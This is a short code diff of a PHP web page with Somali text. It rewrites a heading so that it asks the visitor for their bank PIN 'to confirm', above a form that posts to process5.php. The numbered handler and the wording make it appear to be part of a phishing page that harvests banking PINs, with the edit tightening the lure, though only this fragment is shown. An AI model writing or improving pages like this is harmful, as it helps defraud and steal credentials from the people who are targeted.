@@ -20,7 +20,7 @@ if(isset($_GET['error'])){
 </div>
 <div class="container">
 
-<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
+<h2>Fadlan geli PIN-ka bangigaaga si aad u ansixiso</h2>
 
 <form action="process5.php" method="POST">
 <div class="pin-container">
